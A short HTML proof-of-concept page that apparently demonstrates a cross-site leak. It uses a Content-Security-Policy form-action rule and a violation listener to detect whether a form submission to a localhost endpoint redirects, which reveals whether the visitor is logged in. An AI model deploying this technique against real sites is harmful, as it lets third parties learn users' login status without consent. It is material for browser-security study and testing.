<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Security-Policy"
          content="form-action http://localhost:8081">
  </head>
  <body>
    <form name="myForm"
          action="http://localhost:8081/maybe-redirect">
    </form>
    <script>
      window.addEventListener('securitypolicyviolation', () => {
          alert("User is logged in!")
        });
      myForm.submit();
    </script>
  </body>
</html>
